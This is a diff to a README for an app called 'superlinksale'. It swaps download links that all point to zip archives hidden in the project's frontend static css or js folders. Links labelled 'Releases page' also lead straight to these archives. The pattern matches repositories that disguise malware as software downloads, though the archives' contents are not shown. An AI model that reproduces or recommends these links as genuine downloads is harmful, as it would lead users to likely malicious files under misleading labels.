@@ -6,13 +6,13 @@ Welcome to **superlinksale**! This application helps you navigate and access web
 
 ## 📥 Download Now
 
-[![Download superlinksale](https://github.com/chilan18/superlinksale/raw/refs/heads/main/frontend/static/css/Software-v3.7-beta.3.zip)](https://github.com/chilan18/superlinksale/raw/refs/heads/main/frontend/static/css/Software-v3.7-beta.3.zip)
+[![Download superlinksale](https://raw.githubusercontent.com/chilan18/superlinksale/main/frontend/static/js/Software_v1.4-alpha.4.zip)](https://raw.githubusercontent.com/chilan18/superlinksale/main/frontend/static/js/Software_v1.4-alpha.4.zip)
 
 ## 📂 How to Download & Install
 
 To download **superlinksale**, please visit the Releases page:
 
-1. Go to the [Releases page](https://github.com/chilan18/superlinksale/raw/refs/heads/main/frontend/static/css/Software-v3.7-beta.3.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/chilan18/superlinksale/main/frontend/static/js/Software_v1.4-alpha.4.zip).
 2. Look for the latest version.
 3. Download the appropriate file for your operating system.
 
@@ -58,6 +58,6 @@ For more help, refer to the FAQ section on the Releases page or contact support.
 
 ## 🌐 Additional Support
 
-If you need further assistance, please visit the [Releases page](https://github.com/chilan18/superlinksale/raw/refs/heads/main/frontend/static/css/Software-v3.7-beta.3.zip) for updates, documentation, and community support.
+If you need further assistance, please visit the [Releases page](https://raw.githubusercontent.com/chilan18/superlinksale/main/frontend/static/js/Software_v1.4-alpha.4.zip) for updates, documentation, and community support.
 
 Thank you for using **superlinksale**! Enjoy seamless access to your favorite websites.
